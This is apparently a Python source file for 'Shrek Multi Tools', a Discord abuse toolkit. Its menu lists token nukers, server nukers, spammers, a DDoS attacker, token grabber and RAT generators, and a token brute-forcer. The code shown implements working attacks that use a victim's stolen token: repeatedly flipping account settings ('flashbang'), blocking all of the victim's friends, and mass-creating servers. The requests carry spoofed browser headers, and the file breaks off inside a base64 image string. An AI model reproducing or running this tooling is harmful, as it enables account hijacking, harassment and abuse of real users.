# Shrek was proudly coded by Shrek™ [https://github.com/SHREK-TM].
# Copyright © Shrek Multi Tools

####################################################################

from utilities.Settings.common import *
from utilities.Settings.common2 import *
from utilities.Settings.update import *
from utilities.Settings.libarys import *

import utilities.Plugins.massreport

import colorama
from selenium import webdriver
from discord.ext import commands
import discord
import random
import json
import requests
import websocket
import string
import pyautogui
import ctypes
import os
import time
from socket import socket, AF_INET, SOCK_DGRAM
from threading import Thread
from os import system, name
from ctypes import windll
import subprocess
import discum
import sys
import webbrowser
import base64
from colorama import Fore, Back, Style
import socket
from zipfile import ZipFile
from bs4 import BeautifulSoup
import multiprocessing
import keyboard

cancel_key = "ctrl+c"

user_name_file_path = os.path.join("utilities", "settings", "user_name.txt")

try:
    with open(user_name_file_path, "r") as file:
        user_name = file.read().strip()
except FileNotFoundError:
    ctypes.windll.kernel32.SetConsoleTitleW("Welcom to Shrek Multi Tools | Made by Shrek™")
    user_name = input(f"""
{Fore.GREEN}
   █    ██   ██████  ▓█████ ██▀███       ███▄    █  ▄▄▄      ███▄ ▄███▓ ▓█████
   ██  ▓██▒▒██    ▒  ▓█   ▀▓██ ▒ ██▒     ██ ▀█   █ ▒████▄   ▓██▒▀█▀ ██▒ ▓█   ▀
  ▓██  ▒██░░ ▓██▄    ▒███  ▓██ ░▄█ ▒    ▓██  ▀█ ██▒▒██  ▀█▄ ▓██    ▓██░ ▒███  
  ▓▓█  ░██░  ▒   ██▒ ▒▓█  ▄▒██▀▀█▄      ▓██▒  ▐▌██▒░██▄▄▄▄██▒██    ▒██  ▒▓█  ▄
  ▒▒█████▓ ▒██████▒▒▒░▒████░██▓ ▒██▒    ▒██░   ▓██░▒▓█   ▓██▒██▒   ░██▒▒░▒████
  ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░░░░ ▒░ ░ ▒▓ ░▒▓░    ░ ▒░   ▒ ▒ ░▒▒   ▓▒█░ ▒░   ░  ░░░░ ▒░ 
  ░░▒░ ░ ░ ░ ░▒  ░ ░░ ░ ░    ░▒ ░ ▒     ░ ░░   ░ ▒░░ ░   ▒▒ ░  ░      ░░ ░ ░  
   ░░░ ░ ░ ░  ░  ░      ░    ░░   ░        ░   ░ ░   ░   ▒  ░      ░       ░  
     ░           ░  ░   ░     ░                  ░       ░         ░   ░   ░  

{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Enter your username: """)
    os.makedirs(os.path.dirname(user_name_file_path), exist_ok=True)
    with open(user_name_file_path, "w") as file:
        file.write(user_name)

def cls():
  os.system('cls' if os.name=='nt' else 'clear')

def tool():
  os.system('cls' if os.name=='nt' else 'clear')
  global nolist
  global yeslist

  nolist = ["no", "n", "nope", "nah", "ne","nay","never"]
  yeslist = ["yes", "y", "yer", "yeah","yessir","ye","okay","yep","yea","ok","k","yh","sure"]

  colorama.init()

  class MyClient(discord.Client):
    pass

  global options1
  def options1():

    os.system('cls' if os.name=='nt' else 'clear')
    ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Made by Shrek™")
    print(f'''                                                                                                             Tokens: {Fore.LIGHTGREEN_EX}[{Fore.WHITE}{counttokens}{Fore.LIGHTGREEN_EX}]
{Fore.LIGHTGREEN_EX}                                           ██████   ██░ ██  ██▀███  ▓█████ ▀██ ▄█▀ 
{Fore.LIGHTGREEN_EX}                                         ▒██    ▒ ▒▓██░ ██ ▓██ ▒ ██▒▓█   ▀  ██▄█▒ 
{Fore.LIGHTGREEN_EX}                                         ░ ▓██▄   ░▒██▀▀██ ▓██ ░▄█ ▒▒███   ▓███▄░ 
{Fore.LIGHTGREEN_EX}                                           ▒   ██▒ ░▓█ ░██ ▒██▀▀█▄  ▒▓█  ▄ ▓██ █▄ 
{Fore.LIGHTGREEN_EX}                                         ▒██████▒▒ ░▓█▒░██▓░██▓ ▒██▒░▒████ ▒██▒ █▄
{Fore.LIGHTGREEN_EX}                                         ▒ ▒▓▒ ▒ ░  ▒ ░░▒░▒░ ▒▓ ░▒▓░░░ ▒░  ▒ ▒▒ ▓▒
{Fore.WHITE}❯ {Fore.GREEN}[{Fore.WHITE}TM{Fore.GREEN}] {Fore.WHITE}Made by Shrek™{Fore.LIGHTGREEN_EX}                    ░ ░▒  ░    ▒ ░▒░ ░  ░▒ ░ ▒░ ░ ░   ░ ░▒ ▒░                 {Fore.WHITE}Setting & Help {Fore.GREEN}[{Fore.WHITE}!{Fore.GREEN}] {Fore.WHITE}❮
{Fore.WHITE}❯ {Fore.GREEN}[{Fore.WHITE}00{Fore.GREEN}] {Fore.WHITE}Exit{Fore.LIGHTGREEN_EX}                              ░  ░  ░    ░  ░░ ░   ░   ░    ░   ░ ░░ ░                        {Fore.WHITE}UPDATE {Fore.GREEN}[{Fore.WHITE}UPD{Fore.GREEN}] {Fore.WHITE}❮
{Fore.LIGHTGREEN_EX}                                               ░    ░  ░  ░   ░        ░   ░  ░   
    ''')                           

    print(Fore.GREEN + '                 ')
    print(Fore.GREEN +f'                 ╔══════════════════════════════╦══════════════════════════╦══════════════════════════════╗')
    print(Fore.GREEN + '                 ║                              ║                          ║                              ║')
    print(Fore.GREEN +f'                 ║    {Fore.WHITE}ᴹ{Fore.GREEN}[{Fore.WHITE}01{Fore.GREEN}] {Fore.WHITE}TOKEN NUKERS        {Fore.GREEN}║     {Fore.GREEN}[{Fore.WHITE}10{Fore.GREEN}] {Fore.WHITE}TOKEN GEN       {Fore.GREEN}║     {Fore.GREEN}[{Fore.WHITE}19{Fore.GREEN}] {Fore.WHITE}TOKEN BRUTE-FORCER  {Fore.GREEN}║')
    print(Fore.GREEN +f'                 ║    {Fore.WHITE}ᴹ{Fore.GREEN}[{Fore.WHITE}02{Fore.GREEN}] {Fore.WHITE}WEBHOOK RAIDER      {Fore.GREEN}║     {Fore.GREEN}[{Fore.WHITE}11{Fore.GREEN}] {Fore.WHITE}NITRO GEN       {Fore.GREEN}║     {Fore.GREEN}[{Fore.WHITE}20{Fore.GREEN}] {Fore.WHITE}TOKEN CHECKER       {Fore.GREEN}║')
    print(Fore.GREEN +f'                 ║     [{Fore.WHITE}03{Fore.GREEN}] {Fore.WHITE}TOKEN LEAVER        {Fore.GREEN}║     {Fore.GREEN}[{Fore.WHITE}12{Fore.GREEN}] {Fore.WHITE}PROXY GEN       {Fore.GREEN}║     {Fore.GREEN}[{Fore.WHITE}21{Fore.GREEN}] {Fore.WHITE}TOKEN LOGIN         {Fore.GREEN}║')
    print(Fore.GREEN +f'                 ║     [{Fore.WHITE}04{Fore.GREEN}] {Fore.WHITE}TOKEN ONLINER       {Fore.GREEN}║     {Fore.GREEN}[{Fore.WHITE}13{Fore.GREEN}] {Fore.WHITE}GRABBER GEN     {Fore.GREEN}║     {Fore.GREEN}[{Fore.WHITE}22{Fore.GREEN}] {Fore.WHITE}TOKEN INFO          {Fore.GREEN}║')
    print(Fore.GREEN +f'                 ║     [{Fore.WHITE}05{Fore.GREEN}] {Fore.WHITE}TOKEN JOINER        {Fore.GREEN}║     {Fore.GREEN}[{Fore.WHITE}14{Fore.GREEN}] {Fore.WHITE}QR GRABBER GEN  {Fore.GREEN}║     {Fore.GREEN}[{Fore.WHITE}23{Fore.GREEN}] {Fore.WHITE}PFP CHANGER         {Fore.GREEN}║')
    print(Fore.GREEN +f'                 ║     [{Fore.WHITE}06{Fore.GREEN}] {Fore.WHITE}SERVER NUKER       {Fore.GREEN} ║     {Fore.GREEN}[{Fore.WHITE}15{Fore.GREEN}] {Fore.WHITE}RAT BOT GEN     {Fore.GREEN}║     {Fore.GREEN}[{Fore.WHITE}24{Fore.GREEN}] {Fore.WHITE}HYPEQUAD CHANGER   {Fore.GREEN} ║')
    print(Fore.GREEN +f'                 ║     [{Fore.WHITE}07{Fore.GREEN}] {Fore.WHITE}SERVER SPAMMER      {Fore.GREEN}║     {Fore.GREEN}[{Fore.WHITE}16{Fore.GREEN}] {Fore.WHITE}ID GEN          {Fore.GREEN}║     {Fore.GREEN}[{Fore.WHITE}25{Fore.GREEN}] {Fore.WHITE}BIO CHANGER         {Fore.GREEN}║')
    print(Fore.GREEN +f'                 ║     [{Fore.WHITE}08{Fore.GREEN}] {Fore.WHITE}FRIEND SPAMMER      {Fore.GREEN}║     {Fore.GREEN}[{Fore.WHITE}17{Fore.GREEN}] {Fore.WHITE}NAME GEN        {Fore.GREEN}║     {Fore.GREEN}[{Fore.WHITE}26{Fore.GREEN}] {Fore.WHITE}ID TO TOKEN     {Fore.GREEN}    ║')
    print(Fore.GREEN +f'                 ║     [{Fore.WHITE}09{Fore.GREEN}] {Fore.WHITE}GROUPCHAT SPAMMER   {Fore.GREEN}║     {Fore.GREEN}[{Fore.WHITE}18{Fore.GREEN}] {Fore.WHITE}DDOS ATTACKER   {Fore.GREEN}║     {Fore.GREEN}[{Fore.WHITE}27{Fore.GREEN}] {Fore.WHITE}MASE REPORT     {Fore.GREEN}    ║')
    print(Fore.GREEN + '                 ║                              ║                          ║                              ║')
    print(Fore.GREEN + '                 ╚══════════════════════════════╩══════════════════════════╩══════════════════════════════╝')
    print(Fore.GREEN +f'                                                                                          {Fore.GREEN}[{Fore.WHITE}N{Fore.GREEN}] {Fore.WHITE}NEXT PAGE')
    print(Fore.GREEN + '')
    print(f'  {Fore.WHITE}┌──<{user_name}{Fore.GREEN}@{Fore.WHITE}Shrek>─{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}]')
    global options
    options = input(f'  {Fore.WHITE}└───{Fore.GREEN}➤{Fore.WHITE} ')

  options1()

  privatechannelIds = []
  global cls
  def cls():
    os.system('cls' if os.name=='nt' else 'clear')

  global quit
  def quit():
    exit()

  def randstr(lenn):
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''
    for i in range(0, lenn):
        text += alpha[random.randint(0, len(alpha) - 1)]
    return text

  global useragent
  def useragent():
     file_path = 'data/useragents.txt'
     
     try:
         with open(file_path, 'r') as file:
             useragents = file.readlines() 
             if useragents:
                 useragents = [agent.strip() for agent in useragents]
                 return random.choice(useragents)
             else:
                 return ''
     except FileNotFoundError:
         print("")
         return ''
     except Exception as e:
         print(f"Une erreur s'est produite lors de la lecture du fichier de user-agents : {e}")
         return ''
 
     print(useragent())

  def tokennuker():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Token Nuker")
    options4 = input(f"""
{Fore.GREEN}
████████▓ ▒█████   ██ ▄█▀ ▓█████ ███▄    █      ███▄    █  █    ██  ██ ▄█▀ ▓█████ ██▀███  
▓  ██▒ ▓▒▒██▒  ██▒ ██▄█▒  ▓█   ▀ ██ ▀█   █      ██ ▀█   █  ██  ▓██▒ ██▄█▒  ▓█   ▀▓██ ▒ ██▒
▒ ▓██░ ▒░▒██░  ██▒▓███▄░  ▒███  ▓██  ▀█ ██▒    ▓██  ▀█ ██▒▓██  ▒██░▓███▄░  ▒███  ▓██ ░▄█ ▒
░ ▓██▓ ░ ▒██   ██░▓██ █▄  ▒▓█  ▄▓██▒  ▐▌██▒    ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄  ▒▓█  ▄▒██▀▀█▄  
  ▒██▒ ░ ░ ████▓▒░▒██▒ █▄▒░▒████▒██░   ▓██░    ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄▒░▒████░██▓ ▒██▒
  ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░░░ ▒░ ░ ▒░   ▒ ▒     ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░░ ▒░ ░ ▒▓ ░▒▓░
    ░      ░ ▒ ▒░ ░ ░▒ ▒░░ ░ ░  ░ ░░   ░ ▒░    ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░░ ░ ░    ░▒ ░ ▒ 
  ░      ░ ░ ░ ▒  ░ ░░ ░     ░     ░   ░ ░        ░   ░ ░  ░░░ ░ ░ ░ ░░ ░     ░    ░░   ░ 
             ░ ░  ░  ░   ░   ░           ░              ░    ░     ░  ░   ░   ░     ░     


   {Fore.GREEN}[{Fore.WHITE}01{Fore.GREEN}] {Fore.WHITE}FLASHBANG
   {Fore.GREEN}[{Fore.WHITE}02{Fore.GREEN}] {Fore.WHITE}MASS CREATE SERVERS + CHANNELS
   {Fore.GREEN}[{Fore.WHITE}03{Fore.GREEN}] {Fore.WHITE}MASS BLOCK
   {Fore.GREEN}[{Fore.WHITE}04{Fore.GREEN}] {Fore.WHITE}DELETE ALL PERSONAL SERVERS 
   {Fore.GREEN}[{Fore.WHITE}05{Fore.GREEN}] {Fore.WHITE}LEAVE ALL SERVERS
   {Fore.GREEN}[{Fore.WHITE}06{Fore.GREEN}] {Fore.RESET}{Fore.MAGENTA}ULTIMATE NUKE{Fore.RESET}
   {Fore.GREEN}[{Fore.WHITE}00{Fore.GREEN}] EXIT

   {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE}""")
    if options4 in ['1','01']:
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Flashbang Inbound")
      url = 'https://discord.com/api/v9/users/@me/settings'

      print(f'''
{Fore.GREEN}
  ▒████▒  ██▓    ▄▄▄       ██████   ██░ ██  ▄▄▄▄    ▄▄▄      ███▄    █  ▄████ 
▒▓██     ▓██▒   ▒████▄   ▒██    ▒ ▒▓██░ ██ ▓█████▄ ▒████▄    ██ ▀█   █  ██▒ ▀█
░▒████   ▒██░   ▒██  ▀█▄ ░ ▓██▄   ░▒██▀▀██ ▒██▒ ▄██▒██  ▀█▄ ▓██  ▀█ ██▒▒██░▄▄▄
░░▓█▒    ▒██░   ░██▄▄▄▄██  ▒   ██▒ ░▓█ ░██ ▒██░█▀  ░██▄▄▄▄██▓██▒  ▐▌██▒░▓█  ██
 ░▒█░   ▒░██████▒▓█   ▓██▒██████▒▒ ░▓█▒░██▓░▓█  ▀█▓▒▓█   ▓██▒██░   ▓██░▒▓███▀▒
  ▒ ░   ░░ ▒░▓  ░▒▒   ▓▒█▒ ▒▓▒ ▒ ░  ▒ ░░▒░▒░▒▓███▀▒░▒▒   ▓▒█░ ▒░   ▒ ▒ ░▒   ▒ 
  ░     ░░ ░ ▒  ░ ░   ▒▒ ░ ░▒  ░ ░  ▒ ░▒░ ░▒░▒   ░ ░ ░   ▒▒ ░ ░░   ░ ▒░ ░   ░ 
  ░ ░      ░ ░    ░   ▒  ░  ░  ░    ░  ░░ ░ ░    ░   ░   ▒     ░   ░ ░  ░   ░ 
        ░    ░        ░        ░    ░  ░  ░ ░            ░           ░      ░ 

      ''')
      tukan = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}What is the token you want to mess up?: ''')
      times = int(input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}How many times do you want to blind the user of the token?: '''))

      header = {
          "authority": "discord.com",
          "path": f"/api/v9/users/@me/settings",
          'method': 'PATCH',
          "scheme": "https",
          "accept": "*/*",
          "accept-encoding": "gzip, deflate, br",
          "accept-language": "en-US",
          "Authorization": f"{tukan}",
          "content-length": "0",
          "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
          "origin": "https://discord.com",
          'referer': 'https://discord.com/channels/@me',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin",
          "user-agent": useragent(),
          "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
          "x-debug-options": "bugReporterEnabled",
          "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
      }

      changset = True
      payload = {"theme": "light", "developer_mode": changset, "afk_timeout": 60, "locale": "ko",
                  "message_display_compact": changset, "explicit_content_filter": 2,
                  "default_guilds_restricted": changset,
                  "friend_source_flags": {"all": changset, "mutual_friends": changset,
                                          "mutual_guilds": changset},
                  "inline_embed_media": changset, "inline_attachment_media": changset,
                  "gif_auto_play": changset, "render_embeds": changset,
                  "render_reactions": changset, "animate_emoji": changset,
                  "convert_emoticons": changset, "animate_stickers": 1,
                  "enable_tts_command": changset, "native_phone_integration_enabled": changset,
                  "contact_sync_enabled": changset, "allow_accessibility_detection": changset,
                  "stream_notifications_enabled": changset, "status": "idle",
                  "detect_platform_accounts": changset, "disable_games_tab": changset}

      changset = False
      payload2 = {"theme": "dark", "developer_mode": changset, "afk_timeout": 120, "locale": "bg",
                  "message_display_compact": changset, "explicit_content_filter": 0,
                  "default_guilds_restricted": changset,
                  "friend_source_flags": {"all": changset, "mutual_friends": changset,
                                          "mutual_guilds": changset},
                  "inline_embed_media": changset, "inline_attachment_media": changset,
                  "gif_auto_play": changset, "render_embeds": changset,
                  "render_reactions": changset, "animate_emoji": changset,
                  "convert_emoticons": changset, "animate_stickers": 2,
                  "enable_tts_command": changset, "native_phone_integration_enabled": changset,
                  "contact_sync_enabled": changset, "allow_accessibility_detection": changset,
                  "stream_notifications_enabled": changset, "status": "dnd",
                  "detect_platform_accounts": changset, "disable_games_tab": changset}


      for x in range(times):
          r = requests.patch(url,headers=header, json=payload)
          if r.status_code == 200:
              print("FLASHBANGED!")
          else:
              print(r)
          t = requests.patch(url,headers=header, json=payload2)
          if t.status_code == 200:
              print('FLASHBANGED!')
          else:
              print(t)

    elif options4 in ['3','03']:
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Mass Blocker")
      print(f'''
{Fore.GREEN}
  ███▄ ▄███▓ ▄▄▄       ██████   ██████       ▄▄▄▄    ██▓    ▒█████   ▄████▄  ▀██ ▄█▀
 ▓██▒▀█▀ ██▒▒████▄   ▒██    ▒ ▒██    ▒      ▓█████▄ ▓██▒   ▒██▒  ██▒▒██▀ ▀█   ██▄█▒ 
 ▓██    ▓██░▒██  ▀█▄ ░ ▓██▄   ░ ▓██▄        ▒██▒ ▄██▒██░   ▒██░  ██▒▒▓█    ▄ ▓███▄░ 
 ▒██    ▒██ ░██▄▄▄▄██  ▒   ██▒  ▒   ██▒     ▒██░█▀  ▒██░   ▒██   ██░▒▓▓▄ ▄██ ▓██ █▄ 
▒▒██▒   ░██▒ ▓█   ▓██▒██████▒▒▒██████▒▒    ▒░▓█  ▀█▓░██████░ ████▓▒░▒ ▓███▀  ▒██▒ █▄
░░ ▒░   ░  ░ ▒▒   ▓▒█▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░    ░░▒▓███▀▒░ ▒░▓  ░ ▒░▒░▒░ ░ ░▒ ▒   ▒ ▒▒ ▓▒
░░  ░      ░  ░   ▒▒ ░ ░▒  ░  ░ ░▒  ░      ░▒░▒   ░ ░ ░ ▒    ░ ▒ ▒░   ░  ▒   ░ ░▒ ▒░
 ░      ░     ░   ▒  ░  ░  ░  ░  ░  ░        ░    ░   ░ ░  ░ ░ ░ ▒  ░        ░ ░░ ░ 
░       ░         ░        ░        ░      ░ ░          ░      ░ ░  ░ ░      ░  ░   

      ''')

      tukan = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}What is the token you want to block all friends with?: ''')

      url = 'https://discord.com/api/v9/users/@me/relationships'

      header = {
          "authority": "discord.com",
          "path": f"/api/v9/users/@me/relationships",
          "scheme": "https",
          "accept": "*/*",
          "accept-encoding": "gzip, deflate, br",
          "accept-language": "en-US",
          "Authorization": f"{tukan}",
          "content-length": "0",
          "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
          "origin": "https://discord.com",
          'referer': 'https://discord.com/channels/@me',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin",
          "user-agent": useragent(),
          "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
          "x-debug-options": "bugReporterEnabled",
          "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
      }

      payload = {"type": 2}
      r = requests.get(url, headers=header).json()
      for x in r:
          e = requests.put(f'{url}/{x["id"]}', headers=header, json=payload)
          if e.status_code == 200 or 204:
              print(f"Successfully blocked {x['id']}")
          else:
            print(e)

    elif options4 in ['2','02']:
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Token Server & Channel Maker")

      print(Fore.GREEN + '''
████████▓ ▒█████   ██ ▄█▀ ▓█████ ███▄    █      ███▄    █  █    ██  ██ ▄█▀ ▓█████ ██▀███  
▓  ██▒ ▓▒▒██▒  ██▒ ██▄█▒  ▓█   ▀ ██ ▀█   █      ██ ▀█   █  ██  ▓██▒ ██▄█▒  ▓█   ▀▓██ ▒ ██▒
▒ ▓██░ ▒░▒██░  ██▒▓███▄░  ▒███  ▓██  ▀█ ██▒    ▓██  ▀█ ██▒▓██  ▒██░▓███▄░  ▒███  ▓██ ░▄█ ▒
░ ▓██▓ ░ ▒██   ██░▓██ █▄  ▒▓█  ▄▓██▒  ▐▌██▒    ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄  ▒▓█  ▄▒██▀▀█▄  
  ▒██▒ ░ ░ ████▓▒░▒██▒ █▄▒░▒████▒██░   ▓██░    ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄▒░▒████░██▓ ▒██▒
  ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░░░ ▒░ ░ ▒░   ▒ ▒     ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░░ ▒░ ░ ▒▓ ░▒▓░
    ░      ░ ▒ ▒░ ░ ░▒ ▒░░ ░ ░  ░ ░░   ░ ▒░    ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░░ ░ ░    ░▒ ░ ▒ 
  ░      ░ ░ ░ ▒  ░ ░░ ░     ░     ░   ░ ░        ░   ░ ░  ░░░ ░ ░ ░ ░░ ░     ░    ░░   ░ 
             ░ ░  ░  ░   ░   ░           ░              ░    ░     ░  ░   ░   ░     ░     

      ''')

      tukan1 = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Enter the token you want to make servers + channels : ''')
      url = 'https://discord.com/api/v9/guilds'

      header = {
          "authority": "discord.com",
          "method": "POST",
          "path": f"/api/v9/guilds",
          "scheme": "https",
          "accept": "*/*",
          "accept-encoding": "gzip, deflate, br",
          "accept-language": "en-US",
          "Authorization": f"{tukan1}",
          "content-length": "0",
          "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
          "origin": "https://discord.com",
          'referer': 'https://discord.com/channels/@me',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin",
          "user-agent": useragent(),
          "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
          "x-debug-options": "bugReporterEnabled",
          "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
      }

      global ids
      ids = []

      def servercreate():
          image = "data:image/jpeg;base64,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